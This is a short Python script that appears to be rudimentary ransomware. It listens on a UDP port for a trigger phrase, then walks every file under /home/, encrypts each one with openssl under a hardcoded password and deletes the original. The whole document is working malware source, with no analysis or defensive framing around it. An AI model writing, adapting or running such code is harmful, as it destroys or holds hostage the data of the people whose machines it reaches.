import socket
import os

encrypt_string = 'openssl enc -aes-256-cbc -in {0} -out {1} -pass pass:password'

def encrypt():
    
    for subdir, dirs, files in os.walk('/home/'):
        for file_name in files: 
            file_path = subdir + os.sep + file_name
            cmd_string = encrypt_string.format(file_path, file_path + '.enc')
            os.system(cmd_string)
            os.remove(file_path)
            

def main():

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 54321))
    while True:
        data = sock.recv(1024)
        print data
        if data == 'idru5991a:execute:encrypt5\n':
            print 'encrypt'
	    encrypt()
            return
        


if __name__ == '__main__':
    main()
